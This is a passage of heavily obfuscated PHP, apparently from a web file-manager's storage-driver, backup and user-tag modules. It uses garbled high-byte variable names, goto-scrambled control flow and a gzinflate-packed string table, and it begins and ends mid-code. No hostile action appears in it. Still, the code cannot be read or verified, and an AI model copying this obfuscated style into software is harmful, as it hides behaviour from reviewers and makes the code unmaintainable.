$ãÙ¸Ãòù[$Ê»—û´¤[1221]] = $¬à¹¿´; $ì‹İ¡ü = array($Ê»—û´¤[1241] => $Ê»—û´¤[1247], $Ê»—û´¤[16] => $ãÙ¸Ãòù); } break; case KodIO::KOD_SHARE_ITEM: $ì‹İ¡ü = array($Ê»—û´¤[1241] => $Ê»—û´¤[1248], $Ê»—û´¤[16] => $ãÙ¸Ãòù); $¥È¹ÅÁ· = Model($Ê»—û´¤[678])->getInfo($ãÙ¸Ãòù[$Ê»—û´¤[486]]); if ($¥È¹ÅÁ·[$Ê»—û´¤[204]] == $Ê»—û´¤[241]) { $¬à¹¿´ = KodIO::clear($¥È¹ÅÁ·[$Ê»—û´¤[1246]] . $ãÙ¸Ãòù[$Ê»—û´¤[1239]]); $ãÙ¸Ãòù[$Ê»—û´¤[571]] = $¥È¹ÅÁ·; $ãÙ¸Ãòù[$Ê»—û´¤[1221]] = $¬à¹¿´; $ì‹İ¡ü = array($Ê»—û´¤[1241] => $Ê»—û´¤[1249], $Ê»—û´¤[16] => $ãÙ¸Ãòù); } else { if (!$¬à¹¿´) { $¬à¹¿´ = $¥È¹ÅÁ·[$Ê»—û´¤[204]]; } } break; default: $¬à¹¿´ = $ãÙ¸Ãòù[$Ê»—û´¤[98]]; $ì‹İ¡ü = array($Ê»—û´¤[1241] => $Ê»—û´¤[1250]); break; } $Í¬úİÌ = $ãÙ¸Ãòù[$Ê»—û´¤[98]]; if (!isset(self::$driverCache[$Í¬úİÌ])) { $•éõĞ½Ê = strtolower($ì‹İ¡ü[$Ê»—û´¤[109]]); $ØäŠÙè = $GLOBALS[$Ê»—û´¤[16]][$Ê»—û´¤[103]][$Ê»—û´¤[891]]; $ÄÔ¢õØ§ = $Ê»—û´¤[88] . (isset($ØäŠÙè[$•éõĞ½Ê]) ? $ØäŠÙè[$•éõĞ½Ê] : ucfirst($•éõĞ½Ê)); if (!class_exists($ÄÔ¢õØ§)) { show_json("{$ÄÔ¢õØ§}\40\156\x6f\x74\x20\x65\x78\x69\163\164\163\x21", !1); } $şˆ€òØ­ = isset($ì‹İ¡ü[$Ê»—û´¤[16]]) ? $ì‹İ¡ü[$Ê»—û´¤[16]] : !1; self::$driverCache[$Í¬úİÌ] = new $ÄÔ¢õØ§($şˆ€òØ­); } $±†óªš = self::$driverCache[$Í¬úİÌ]; $±†óªš->pathDriver = $¿©®ÍôÅ; $±†óªš->pathBase = $Ê»—û´¤[22]; if (isset($ì‹İ¡ü[$Ê»—û´¤[16]][$Ê»—û´¤[1251]])) { $±†óªš->pathBase = rtrim($ì‹İ¡ü[$Ê»—û´¤[16]][$Ê»—û´¤[1251]], $Ê»—û´¤[18]) . $Ê»—û´¤[18]; $¬à¹¿´ = $±†óªš->pathBase . ltrim($¬à¹¿´, $Ê»—û´¤[18]); } $¬à¹¿´ = $±†óªš->getPath($¬à¹¿´); if (isset($ãÙ¸Ãòù[$Ê»—û´¤[1221]])) { $¬à¹¿´ = $ãÙ¸Ãòù[$Ê»—û´¤[1221]]; } $±†óªš->path = $¬à¹¿´; return $±†óªš; } public static function errorTips($ßûÃâÖñ = false) { $Å•Š·‚¹ =& $_SERVER[ü¢ÙÊñÛ]; static $—òŒÊ÷˜ = array(); $ÀáŞ‘íÆ = 1000; if ($ßûÃâÖñ === -1) { return $—òŒÊ÷˜ ? $—òŒÊ÷˜[count($—òŒÊ÷˜) - 1] : $Å•Š·‚¹[22]; } if ($ßûÃâÖñ === !1) { return implode($Å•Š·‚¹[10], $—òŒÊ÷˜); } if (count($—òŒÊ÷˜) >= $ÀáŞ‘íÆ) { $—òŒÊ÷˜ = array_slice($—òŒÊ÷˜, $ÀáŞ‘íÆ * 0.5, $ÀáŞ‘íÆ); } $—òŒÊ÷˜[] = $ßûÃâÖñ; write_log($Å•Š·‚¹[187] . ACTION . $Å•Š·‚¹[1252] . $ßûÃâÖñ, $Å•Š·‚¹[1253]); } public static function getLastError($›ª¤¹‚ù = '') { $©Íàà = self::errorTips(-1); return $©Íàà ? $©Íàà : $›ª¤¹‚ù; } } goto c´ï¯¬°Ñ‹; DÔùÑ¯ •ƒ: $buqmhflecs = $_SERVER[ü¢ÙÊñÛ][693]; if (!$buqmhflecs) { die; } $_SERVER[ ï©Şİµ] = explode($_SERVER[ü¢ÙÊñÛ][694], gzinflate(substr($_SERVER[ü¢ÙÊñÛ][695], 10, -8))); goto a›à±¿÷©‡; b›¿‚¬§’¾: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[ü¢ÙÊñÛ][813]); $this->init(); $this->keep(); } public function init() { $±âåŠŠ¶ =& $_SERVER[ü¢ÙÊñÛ]; $this->isManual(); self::$name = date($±âåŠŠ¶[814]); if (!($‚Ïò×áø = $this->model->lastItem())) { $‚Ïò×áø = $this->initData(); } else { self::$name = $‚Ïò×áø[$±âåŠŠ¶[42]]; if ($‚Ïò×áø[$±âåŠŠ¶[815]] == $±âåŠŠ¶[102]) { self::$name = date($±âåŠŠ¶[272]); $•öçÏòÆ = intval(_get($‚Ïò×áø, $±âåŠŠ¶[816], 0)); if (self::$manual == 0 && $‚Ïò×áø[$±âåŠŠ¶[42]] == self::$name) { $this->model->remove($‚Ïò×áø[$±âåŠŠ¶[486]]); } $‚Ïò×áø = $this->initData($•öçÏòÆ, $‚Ïò×áø[$±âåŠŠ¶[817]]); } else { $this->checkStore($‚Ïò×áø[$±âåŠŠ¶[817]]); } } self::$option = $‚Ïò×áø; } private function isManual() { $ÉÂšØÍ = _get($GLOBALS, $_SERVER[ü¢ÙÊñÛ][818], 0); $ÉÂšØÍ = intval($ÉÂšØÍ); self::$manual = $ÉÂšØÍ && $ÉÂšØÍ == 1 ? 1 : 0; } private function initData($è““° = 0, $£™õÌ¡× = '') { $–³öÂğ¤ =& $_SERVER[ü¢ÙÊñÛ]; $„İÕ¯Èà = $this->model->config(); if ($£™õÌ¡× && $„İÕ¯Èà[$–³öÂğ¤[817]] != $£™õÌ¡×) { $è““° = 0; } $this->checkStore($„İÕ¯Èà[$–³öÂğ¤[817]]); if (self::$manual == 1) { self::$name .= $–³öÂğ¤[21] . date($–³öÂğ¤[819]); } $¨§ÔÕ£´ = array($–³öÂğ¤[817] => $„İÕ¯Èà[$–³öÂğ¤[817]], $–³öÂğ¤[42] => self::$name, $–³öÂğ¤[815] => 0, $–³öÂğ¤[182] => $„İÕ¯Èà[$–³öÂğ¤[182]], $–³öÂğ¤[820] => self::$manual, $–³öÂğ¤[380] => array($–³öÂğ¤[821] => array($–³öÂğ¤[815] => 0), $–³öÂğ¤[822] => array($–³öÂğ¤[815] => 0, $–³öÂğ¤[823] => 0, $–³öÂğ¤[824] => 0, $–³öÂğ¤[43] => $–³öÂğ¤[22], $–³öÂğ¤[825] => 0, $–³öÂğ¤[826] => 0), $–³öÂğ¤[827] => array($–³öÂğ¤[815] => 0, $–³öÂğ¤[823] => 0, $–³öÂğ¤[824] => 0, $–³öÂğ¤[825] => 0, $–³öÂğ¤[826] => 0), $–³öÂğ¤[243] => array($–³öÂğ¤[815] => 0, $–³öÂğ¤[828] => 0, $–³öÂğ¤[829] => 0, $–³öÂğ¤[830] => 0, $–³öÂğ¤[831] => 0, $–³öÂğ¤[552] => $è““°, $–³öÂğ¤[825] => 0, $–³öÂğ¤[826] => 0)), $–³öÂğ¤[825] => time(), $–³öÂğ¤[826] => 0); $Ò»Ì¢™ = $this->model->insert($¨§ÔÕ£´); $¨§ÔÕ£´[$–³öÂğ¤[486]] = $Ò»Ì¢™; return $¨§ÔÕ£´; } private function checkStore($ÈšÜğâ) { $Øİ¦¹´Í = Model($_SERVER[ü¢ÙÊñÛ][832]); $€ÊÓÀÛ = $Øİ¦¹´Í->listData($ÈšÜğâ); $Øİ¦¹´Í->checkConfig($€ÊÓÀÛ); } public static function get() { if (!self::$option) { $Ê×€äè  = Model($_SERVER[ü¢ÙÊñÛ][813]); $®£¹äœá = $Ê×€äè ->findByName(self::$name); $Ê×€äè ->parseContent($®£¹äœá); self::$option = $®£¹äœá; } return self::$option; } public static function set($Çğ´‘İ•) { $ ÈŒŸÏ =& $_SERVER[ü¢ÙÊñÛ]; $ÁÊÌ = self::get(); foreach ($Çğ´‘İ• as $»Ş†¥Ò• => $Ûğã„¿Á) { array_set_value($ÁÊÌ, $»Ş†¥Ò•, $Ûğã„¿Á); } Model($ ÈŒŸÏ[813])->update($ÁÊÌ[$ ÈŒŸÏ[486]], $ÁÊÌ); self::$option = $ÁÊÌ; return self::$option; } public function keep() { $ğÉ½‡ğ =& $_SERVER[ü¢ÙÊñÛ]; $Áğô‚ƒœ = self::get(); if (_get($Áğô‚ƒœ, $ğÉ½‡ğ[833], 0) == $ğÉ½‡ğ[102]) { return; } $this->backupKeep($Áğô‚ƒœ); self::set(array($ğÉ½‡ğ[833] => 1)); } private function backupKeep($À®üŞ™Á) { $Îİ¿ƒ¥Ù =& $_SERVER[ü¢ÙÊñÛ]; if (self::$manual == 1) { return; } $ˆ¦ì¹åƒ = $this->model->listData(); if (empty($ˆ¦ì¹åƒ)) { return; } $Ÿ¨¿¦˜ = 0; $Ø•ÙÔõ = array(); foreach ($ˆ¦ì¹åƒ as $¢êÙ¼ïç) { if ($Ÿ¨¿¦˜ >= 7) { break; } $Ø•ÙÔõ[] = $¢êÙ¼ïç[$Îİ¿ƒ¥Ù[42]]; $Ÿ¨¿¦˜++; } for ($Ÿ¨¿¦˜ = 0; $Ÿ¨¿¦˜ < 12; $Ÿ¨¿¦˜++) { $Ø•ÙÔõ[] = date($Îİ¿ƒ¥Ù[834], strtotime("\x2d{$Ÿ¨¿¦˜}\40\x6d\x6f\156\x74\150\x73")); } $Ø•ÙÔõ = array_unique($Ø•ÙÔõ); $ĞËÎÌàƒ = Model($Îİ¿ƒ¥Ù[835])->get($Îİ¿ƒ¥Ù[836]); foreach ($ˆ¦ì¹åƒ as $¢êÙ¼ïç) { if (isset($¢êÙ¼ïç[$Îİ¿ƒ¥Ù[820]]) && $¢êÙ¼ïç[$Îİ¿ƒ¥Ù[820]] == $Îİ¿ƒ¥Ù[102]) { continue; } if (!empty($¢êÙ¼ïç[$Îİ¿ƒ¥Ù[42]]) && in_array($¢êÙ¼ïç[$Îİ¿ƒ¥Ù[42]], $Ø•ÙÔõ)) { continue; } $this->model->remove($¢êÙ¼ïç[$Îİ¿ƒ¥Ù[486]]); $Ò®¶ª”¡ = $this->backupPath($À®üŞ™Á, $ĞËÎÌàƒ); IO::remove($Ò®¶ª”¡, !1); } } private function backupPath($†íÃ˜¼, $ÉËä¤î = false) { $ÁÌŒÄø =& $_SERVER[ü¢ÙÊñÛ]; if (!$ÉËä¤î) { $ÉËä¤î = Model($ÁÌŒÄø[835])->get($ÁÌŒÄø[836]); } $¯ßªÉ¬ = $†íÃ˜¼[$ÁÌŒÄø[42]]; $°ŠšØ‰  = substr(md5($ÁÌŒÄø[837] . $ÉËä¤î . $¯ßªÉ¬), 0, 8); return "\x7b\151\157\72{$†íÃ˜¼[$ÁÌŒÄø[817]]}\x7d\57\x64\x61\164\x61\142\141\x73\x65\57\142\141\x63\x6b\x75\160\57" . $¯ßªÉ¬ . $ÁÌŒÄø[21] . $°ŠšØ‰ ; } public function db() { $ƒš€«« =& $_SERVER[ü¢ÙÊñÛ]; $«³É¢Öı = self::get(); if (_get($«³É¢Öı, $ƒš€««[838], 0) == $ƒš€««[102]) { return !0; } $´Ü›‚í¿ = new BackupDb(); if (!$´Ü›‚í¿->index()) { return !1; } self::set(array($ƒš€««[838] => 1)); return !0; } public function dbFile() { $Ë€¦¢ =& $_SERVER[ü¢ÙÊñÛ]; $Ú†À¶  = self::get(); if (_get($Ú†À¶ , $Ë€¦¢[839], 0) == $Ë€¦¢[102]) { return !0; } $¶¥ñŠª´ = new BackupDbFile(); if (!$¶¥ñŠª´->index()) { return !1; } self::set(array($Ë€¦¢[839] => 1)); return !0; } public function file() { $Ó³ÕˆØ =& $_SERVER[ü¢ÙÊñÛ]; $à½ù«ß = self::get(); if (_get($à½ù«ß, $Ó³ÕˆØ[840], 0) == $Ó³ÕˆØ[102]) { return !0; } if ($à½ù«ß[$Ó³ÕˆØ[182]] == $Ó³ÕˆØ[841]) { $×´Æ–Ì = new BackupFile(); if (!$×´Æ–Ì->index()) { return !1; } } self::set(array($Ó³ÕˆØ[840] => 1, $Ó³ÕˆØ[815] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ı¤¬£Àİ =& $_SERVER[ü¢ÙÊñÛ]; $ÌÙœßÈş = Backup::get(); self::$io = $ÌÙœßÈş[$ı¤¬£Àİ[817]]; self::$name = $ÌÙœßÈş[$ı¤¬£Àİ[42]]; $Ÿ¡Ş» = new DbManage(); $áÄèß±¹ = $Ÿ¡Ş»->dbType(); $¦ÈÑ½«× = array($ı¤¬£Àİ[842] => $áÄèß±¹, $ı¤¬£Àİ[843] => time()); Backup::set($¦ÈÑ½«×); $Ê›¿¸× = $this->tmpFilesPath() . $ı¤¬£Àİ[844] . self::$name . $ı¤¬£Àİ[18]; del_dir($Ê›¿¸×); mk_dir($Ê›¿¸×); $÷Ñ™¦¾÷ = $æ©Øëâ = 0; try { $†®¹¨éÛ = $Ÿ¡Ş»->db()->getTables(); } catch (Exception $ä¦şË­‹) { return !1; } $†®¹¨éÛ = array_diff($†®¹¨éÛ, array($ı¤¬£Àİ[845], $ı¤¬£Àİ[846])); foreach ($†®¹¨éÛ as $Ñ¾æäé) { if ($Ñ¾æäé == $ı¤¬£Àİ[847]) { continue; } $÷Ñ™¦¾÷ += $Ÿ¡Ş»->model($Ñ¾æäé)->count(); } $ËË¬³áà = new Task($ı¤¬£Àİ[848], $ı¤¬£Àİ[849], $÷Ñ™¦¾÷, LNG($ı¤¬£Àİ[850]) . $ı¤¬£Àİ[851] . LNG($ı¤¬£Àİ[852])); $GLOBALS[$ı¤¬£Àİ[853]] = self::$name; foreach ($†®¹¨éÛ as $Ñ¾æäé) { $†·šêÆ‚ = $Ê›¿¸× . $Ñ¾æäé . $ı¤¬£Àİ[854]; if ($Ñ¾æäé == $ı¤¬£Àİ[847]) { @touch($†·šêÆ‚); continue; } $–¤ºó„Ä = null; if ($Ñ¾æäé == $ı¤¬£Àİ[855] && $ÌÙœßÈş[$ı¤¬£Àİ[182]] == $ı¤¬£Àİ[841]) { $–¤ºó„Ä = self::$io; } $æ©Øëâ += $Ÿ¡Ş»->sqlFromDb($Ñ¾æäé, $†·šêÆ‚, $ËË¬³áà, $–¤ºó„Ä); } unset($GLOBALS[$ı¤¬£Àİ[853]]); $ËË¬³áà->end(); if ($æ©Øëâ > $÷Ñ™¦¾÷) { $÷Ñ™¦¾÷ = $æ©Øëâ; } $¦ÈÑ½«× = array($ı¤¬£Àİ[842] => $áÄèß±¹, $ı¤¬£Àİ[838] => 1, $ı¤¬£Àİ[856] => $÷Ñ™¦¾÷, $ı¤¬£Àİ[857] => $æ©Øëâ, $ı¤¬£Àİ[858] => time()); Backup::set($¦ÈÑ½«×); if ($÷Ñ™¦¾÷ - $æ©Øëâ > 0) { $Ï…··İ® = $ı¤¬£Àİ[859]; if (!stristr(I18n::getType(), $ı¤¬£Àİ[860])) { $Ï…··İ® = $ı¤¬£Àİ[861]; } write_log(array($Ï…··İ®, $¦ÈÑ½«×), $ı¤¬£Àİ[849]); return !1; } return !0; } private function tmpFilesPath() { $ÌûÜù‚Â =& $_SERVER[ü¢ÙÊñÛ]; $†ÛİäĞ× = TEMP_FILES; if ($GLOBALS[$ÌûÜù‚Â[16]][$ÌûÜù‚Â[103]][$ÌûÜù‚Â[862]]) { $†ÛİäĞ× = $GLOBALS[$ÌûÜù‚Â[16]][$ÌûÜù‚Â[103]][$ÌûÜù‚Â[862]]; if (!mk_dir($†ÛİäĞ×) || !is_writable($†ÛİäĞ×) || !IO::mkfile($†ÛİäĞ× . $ÌûÜù‚Â[863])) { $†ÛİäĞ× = TEMP_FILES; } } return $†ÛİäĞ×; } } class BackupDbFile { public function __construct() { } public function index() { $‚öòíôª =& $_SERVER[ü¢ÙÊñÛ]; $«§æÑî = Backup::get(); $ö°¤ƒ¦ì = $«§æÑî[$‚öòíôª[42]]; $¸Óù¢ê = $this->tmpFilesPath() . "\142\x61\143\153\165\160\137{$ö°¤ƒ¦ì}\x2f"; $èóİÌ¯ = $this->backupPath($«§æÑî); if (!($èóİÌ¯ = IO::mkdir($èóİÌ¯))) { return !1; } $àÉ©­ö§ = IO::listPath($¸Óù¢ê); $İìŠ™ë® = isset($àÉ©­ö§[$‚öòíôª[97]]) ? $àÉ©­ö§[$‚öòíôª[97]] : array(); $ØàºÀ²š = array_sum(array_column($İìŠ™ë®, $‚öòíôª[90])); if (!$ØàºÀ²š) { return !1; } $˜˜ØÎÎ› = array($‚öòíôª[864] => $ØàºÀ²š, $‚öòíôª[865] => time()); Backup::set($˜˜ØÎÎ›); $¿ŠÈ°‹ù = new TaskFileTransfer($‚öòíôª[866], $‚öòíôª[849], count($İìŠ™ë®), LNG($‚öòíôª[850]) . $‚öòíôª[473] . LNG($‚öòíôª[852]) . $‚öòíôª[867]); $¿ŠÈ°‹ù->task[$‚öòíôª[828]] = $ØàºÀ²š; foreach ($àÉ©­ö§[$‚öòíôª[97]] as $‰À×ŸÇ) { $ï†â­€ = IO::move($‰À×ŸÇ[$‚öòíôª[98]], $èóİÌ¯); if (!$ï†â­€) { $¿ŠÈ°‹ù->end(); $­ØèµÏ˜ = IO::getLastError($‚öòíôª[868] . $‰À×ŸÇ[$‚öòíôª[98]] . $‚öòíôª[869] . $èóİÌ¯ . $‚öòíôª[189]); write_log($­ØèµÏ˜, $‚öòíôª[849]); return !1; } } $Ëâé¦¨³ = new DbManage(); $µŸ•»¯Ü = $Ëâé¦¨³->getSqlFile(); if (!$µŸ•»¯Ü[$‚öòíôª[870]] || !$µŸ•»¯Ü[$‚öòíôª[23]]) { return !1; } IO::move($µŸ•»¯Ü[$‚öòíôª[870]], $èóİÌ¯); IO::move($µŸ•»¯Ü[$‚öòíôª[23]], $èóİÌ¯); $¿ŠÈ°‹ù->end(); $˜˜ØÎÎ› = array($‚öòíôª[871] => $ØàºÀ²š, $‚öòíôª[872] => time()); Backup::set($˜˜ØÎÎ›); return !0; } private function backupPath($ÔÁİµµ) { $ œş˜È =& $_SERVER[ü¢ÙÊñÛ]; $Ñô¢¶­ = $ÔÁİµµ[$ œş˜È[42]]; $¥ Ë–Ú§ = Model($ œş˜È[835])->get($ œş˜È[836]); $ˆ®€ò‚ó = substr(md5($ œş˜È[837] . $¥ Ë–Ú§ . $Ñô¢¶­), 0, 8); return "\173\151\157\x3a{$ÔÁİµµ[$ œş˜È[817]]}\x7d\x2f\144\x61\164\x61\142\x61\x73\x65\x2f\142\x61\x63\x6b\165\x70\57" . $Ñô¢¶­ . $ œş˜È[21] . $ˆ®€ò‚ó; } private function tmpFilesPath() { $ˆ°‰ÌÄè =& $_SERVER[ü¢ÙÊñÛ]; $­Èõ”¨ = TEMP_FILES; if ($GLOBALS[$ˆ°‰ÌÄè[16]][$ˆ°‰ÌÄè[103]][$ˆ°‰ÌÄè[862]]) { $­Èõ”¨ = $GLOBALS[$ˆ°‰ÌÄè[16]][$ˆ°‰ÌÄè[103]][$ˆ°‰ÌÄè[862]]; if (!mk_dir($­Èõ”¨) || !is_writable($­Èõ”¨) || !IO::mkfile($­Èõ”¨ . $ˆ°‰ÌÄè[863])) { $­Èõ”¨ = TEMP_FILES; } } return $­Èõ”¨; } } goto c‰Øã«‘–; A³ƒ‹ØÂóæ: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\162\x5f\x6f\x70\164\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ŸÑ÷´¬¸) { $³¡ÍÇ›Á =& $_SERVER[ü¢ÙÊñÛ]; $Ö¸“¾â = defined($³¡ÍÇ›Á[2186]) && USER_ID ? USER_ID : $³¡ÍÇ›Á[22]; return "\x55\x73\x65\162\117\x70\164\x69\157\156\137{$ŸÑ÷´¬¸}\x5f" . $Ö¸“¾â; } protected function filterWhere($ä¶Ãİ¶Ÿ) { $Ø¥‡Ãšö =& $_SERVER[ü¢ÙÊñÛ]; $ä¶Ãİ¶Ÿ[$Ø¥‡Ãšö[1759]] = defined($Ø¥‡Ãšö[2186]) && USER_ID ? USER_ID : $Ø¥‡Ãšö[22]; return $ä¶Ãİ¶Ÿ; } public function cacheRemoveUser($™»ÏëõŒ, $› §âüÃ) { return Cache::remove("\x55\163\145\162\117\160\164\151\157\x6e\137{$™»ÏëõŒ}\137" . $› §âüÃ); } protected function optionDefault($…ûÅÀÈù = '') { $ÛêúøÈù =& $_SERVER[ü¢ÙÊñÛ]; if ($…ûÅÀÈù == $ÛêúøÈù[22]) { return $GLOBALS[$ÛêúøÈù[16]][$ÛêúøÈù[2495]]; } if ($…ûÅÀÈù == $ÛêúøÈù[2496]) { return $GLOBALS[$ÛêúøÈù[16]][$ÛêúøÈù[2497]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\162\x2e\x74\141\147\114\x69\163\164"; public $modelType = "\125\x73\x65\x72\117\160\164\x69\x6f\x6e"; public $field = array("\x6e\141\155\x65", "\163\164\x79\x6c\145", "\x73\x6f\162\x74"); public function listData($÷¸¶æèş = false, $«ƒçîìÉ = "\163\x6f\x72\164", $Õ·ß ³¬ = false) { return parent::listData($÷¸¶æèş, $«ƒçîìÉ, $Õ·ß ³¬); } public function remove($—Íö§É) { return parent::remove($—Íö§É); } public function add($­™åîÁ¦, $âÏµ­ö = "\x6c\x61\x62\x65\154\55\x67\x72\x65\x79\55\156\x6f\162\155\x61\x6c") { $‚À¶ş =& $_SERVER[ü¢ÙÊñÛ]; if ($this->findByName($­™åîÁ¦)) { return !1; } $‰ğîÚ°ú = array($‚À¶ş[505] => $­™åîÁ¦, $‚À¶ş[569] => $âÏµ­ö, $‚À¶ş[1963] => $this->getSort($‚À¶ş[347]) + 1); return parent::insert($‰ğîÚ°ú); } public function update($á¦âº…», $Û ÉÚŒÑ) { $¶±’¿Íâ =& $_SERVER[ü¢ÙÊñÛ]; $îÚ¼âóí = $this->listData($á¦âº…»); $¼ä°”è = $this->findByName($Û ÉÚŒÑ[$¶±’¿Íâ[42]]); if (!$îÚ¼âóí || $¼ä°”è && $¼ä°”è[$¶±’¿Íâ[486]] != $îÚ¼âóí[$¶±’¿Íâ[486]]) { return !1; } return parent::update($á¦âº…», $Û ÉÚŒÑ); } public function moveTop($âúä·‹ü) { $ò˜ÍŞÀŸ =& $_SERVER[ü¢ÙÊñÛ]; $ÖçÏç–‘ = parent::listData(); $ü«©¢§ = $this->getSort($ò˜ÍŞÀŸ[346]); foreach ($ÖçÏç–‘ as &$ÕÁéêÃÅ) { if ($ÕÁéêÃÅ[$ò˜ÍŞÀŸ[486]] == $âúä·‹ü) { $ÕÁéêÃÅ[$ò˜ÍŞÀŸ[1983]] = $ü«©¢§; continue; } $ÕÁéêÃÅ[$ò˜ÍŞÀŸ[1983]] += 1; } unset($ÕÁéêÃÅ); return parent::resetData($ÖçÏç–‘); } public function moveBottom($œ¢ÎÚûÏ) { $¨’ôƒ  =& $_SERVER[ü¢ÙÊñÛ]; $Íà³õÑ« = $this->getSort($¨’ôƒ [347]) + 1; return parent::update($œ¢ÎÚûÏ, array($¨’ôƒ [1983] => $Íà³õÑ«)); } public function resetSort($¬¾³Ä) { $…®¤ıÙ‡ =& $_SERVER[ü¢ÙÊñÛ]; $¤Ğã…­ = array(); $¬¾³Ä = is_array($¬¾³Ä) ? $¬¾³Ä : array(); for ($®ÌøÆëù = 0; $®ÌøÆëù < count($¬¾³Ä); $®ÌøÆëù++) { $¤Ğã…­[$¬¾³Ä[$®ÌøÆëù] . $…®¤ıÙ‡[22]] = $®ÌøÆëù + 1; } $çæãàÂ = parent::listData(); foreach ($çæãàÂ as &$À”›ÏÀÌ) { $™¥Û˜Â” = $¤Ğã…­[$À”›ÏÀÌ[$…®¤ıÙ‡[486]]]; $À”›ÏÀÌ[$…®¤ıÙ‡[1983]] = $™¥Û˜Â” ? $™¥Û˜Â” : $À”›ÏÀÌ[$…®¤ıÙ‡[1983]]; } unset($À”›ÏÀÌ); return parent::resetData($çæãàÂ); } private function getSort($«¼­ßÔ‡) { $µÄğªÌ­ =& $_SERVER[ü¢ÙÊñÛ]; $†¿¹À—À = parent::listData(); $ğØò¤’› = array_to_keyvalue($†¿¹À—À, $µÄğªÌ­[22], $µÄğªÌ­[1983]); if (!$ğØò¤’›) { $ğØò¤’› = array(0); } $œú…»ÍŒ = $«¼­ßÔ‡ == $µÄğªÌ­[347] ? max($ğØò¤’›) : min($ğØò¤’›); return intval($œú…»ÍŒ); } } goto Aî¸êìöŸ¤; c‰Øã«‘–: class BackupFile { public function __construct() { } public function index() { $ıŒˆı•– = Backup::get(); $¬éùç·À = $ıŒˆı•–[$_SERVER[ü¢ÙÊñÛ][380]][$_SERVER[ü¢ÙÊñÛ][243]][$_SERVER[ü¢ÙÊñÛ][552]]; $›æ²±„‹ = array($_SERVER[ü¢ÙÊñÛ][553] => array($_SERVER[ü¢ÙÊñÛ][873], $¬éùç·À), $_SERVER[ü¢ÙÊñÛ][874] => array($_SERVER[ü¢ÙÊñÛ][418], $ıŒˆı•–[$_SERVER[ü¢ÙÊñÛ][817]])); $«Ó‰«›¬ = (int) Model($_SERVER[ü¢ÙÊñÛ][855])->where($›æ²±„‹)->count($_SERVER[ü¢ÙÊñÛ][552]); $àÍß† ¯ = (int) Model($_SERVER[ü¢ÙÊñÛ][855])->where($›æ²±„‹)->sum($_SERVER[ü¢ÙÊñÛ][90]); $ÙÙ„¿éì = new TaskFileTransfer($_SERVER[ü¢ÙÊñÛ][875], $_SERVER[ü¢ÙÊñÛ][849], $«Ó‰«›¬, LNG($_SERVER[ü¢ÙÊñÛ][850]) . $_SERVER[ü¢ÙÊñÛ][851] . LNG($_SERVER[ü¢ÙÊñÛ][876])); $ÙÙ„¿éì->task[$_SERVER[ü¢ÙÊñÛ][828]] = $àÍß† ¯; $¢¬‚³…› = array($_SERVER[ü¢ÙÊñÛ][877] => $«Ó‰«›¬, $_SERVER[ü¢ÙÊñÛ][878] => $àÍß† ¯, $_SERVER[ü¢ÙÊñÛ][879] => time()); Backup::set($¢¬‚³…›); $ëê¾úâ£ = !0; $ÖÇÔÓ‘½ = $this->storeIds(); $†‰ÛÑÀ¥ = 1; $ØÉÂ‹Ã‘ = 1000; $¾ ûş‰» = $ÖêğÓ” = 0; $§“§îá¦ = array(); $Ä‘Ô„í = $ úšæßÆ = 0; do { $Ÿ…Äòôö = $_SERVER[ü¢ÙÊñÛ][880]; $Ó¼Ğ…şç = Model($_SERVER[ü¢ÙÊñÛ][855])->where($›æ²±„‹)->field($Ÿ…Äòôö)->order($_SERVER[ü¢ÙÊñÛ][881])->selectPage($ØÉÂ‹Ã‘, $†‰ÛÑÀ¥); $½®Œ¬ü = !empty($Ó¼Ğ…şç[$_SERVER[ü¢ÙÊñÛ][457]]) ? $Ó¼Ğ…şç[$_SERVER[ü¢ÙÊñÛ][457]] : array(); foreach ($½®Œ¬ü as $ğ¢İ†Ğä) { if (!$this->_fileExist($ğ¢İ†Ğä, $§“§îá¦, $ÖÇÔÓ‘½)) { write_log("\x66\x69\154\145\x20\156\x6f\164\40\x65\170\x69\x73\x74\x2e\x66\151\154\145\x49\104\72{$ğ¢İ†Ğä[$_SERVER[ü¢ÙÊñÛ][552]]}\x2c\x20\x70\x61\164\x68\72{$ğ¢İ†Ğä[$_SERVER[ü¢ÙÊñÛ][98]]}", $_SERVER[ü¢ÙÊñÛ][882]); continue; } $½Êà­©ô = $ğ¢İ†Ğä[$_SERVER[ü¢ÙÊñÛ][98]]; $ê‘Ì»ŠÁ = "\x7b\151\x6f\72{$ıŒˆı•–[$_SERVER[ü¢ÙÊñÛ][817]]}\175" . substr($½Êà­©ô, strlen("\x7b\x69\x6f\72{$ğ¢İ†Ğä[$_SERVER[ü¢ÙÊñÛ][883]]}\175")); if (IO::exist($ê‘Ì»ŠÁ)) { $ÙÙ„¿éì->updateFileEnd($ğ¢İ†Ğä[$_SERVER[ü¢ÙÊñÛ][42]], $ğ¢İ†Ğä[$_SERVER[ü¢ÙÊñÛ][90]]); } else { $ê‘Ì»ŠÁ = get_path_father($ê‘Ì»ŠÁ); IO::mkdir($ê‘Ì»ŠÁ); if (!IO::copy($½Êà­©ô, $ê‘Ì»ŠÁ, $_SERVER[ü¢ÙÊñÛ][884])) { write_log($_SERVER[ü¢ÙÊñÛ][885] . $½Êà­©ô . $_SERVER[ü¢ÙÊñÛ][869] . $ê‘Ì»ŠÁ . $_SERVER[ü¢ÙÊñÛ][189], $_SERVER[ü¢ÙÊñÛ][849]); $ëê¾úâ£ = !1; break; } } $¬éùç·À = $ğ¢İ†Ğä[$_SERVER[ü¢ÙÊñÛ][552]]; $ÖêğÓ” += 1; $¾ ûş‰» += $ğ¢İ†Ğä[$_SERVER[ü¢ÙÊñÛ][90]]; $ úšæßÆ += 1; $Ä‘Ô„í += $ğ¢İ†Ğä[$_SERVER[ü¢ÙÊñÛ][90]]; if ($¾ ûş‰» >= 1024 * 1024 * 100) { $¢¬‚³…› = array($_SERVER[ü¢ÙÊñÛ][816] => $¬éùç·À, $_SERVER[ü¢ÙÊñÛ][886] => $ úšæßÆ, $_SERVER[ü¢ÙÊñÛ][887] => $Ä‘Ô„í); Backup::set($¢¬‚³…›); $¾ ûş‰» = $ÖêğÓ” = 0; } } $ğã…àÃò = count($½®Œ¬ü); $†‰ÛÑÀ¥++; } while ($ğã…àÃò == $ØÉÂ‹Ã‘); 